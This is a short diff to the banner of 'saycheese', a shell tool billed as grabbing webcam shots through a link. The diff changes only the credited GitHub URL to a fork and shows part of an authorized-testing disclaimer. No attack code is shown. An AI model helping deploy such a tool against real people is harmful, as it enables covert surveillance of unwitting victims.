@@ -16,7 +16,7 @@ printf "      \e[1;92m              |___/ \e[0m                                 
 printf "\n"                                                              
 printf "\e[1;77m               .:.:\e[0m\e[1;93m Grab webcam shots by link \e[0m\e[1;77m:.:.\e[0m\n"                              
 printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]              v1.2 coded by @linux_choice              \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
-printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]          github.com/thelinuxchoice/saycheese          \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
+printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]          https://github.com/Mighty-raju/saycheese          \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
 printf "\n"
 printf "        \e[1;91m Disclaimer: this tool is designed for security\n"
 printf "         testing in an authorized simulated cyberattack\n"
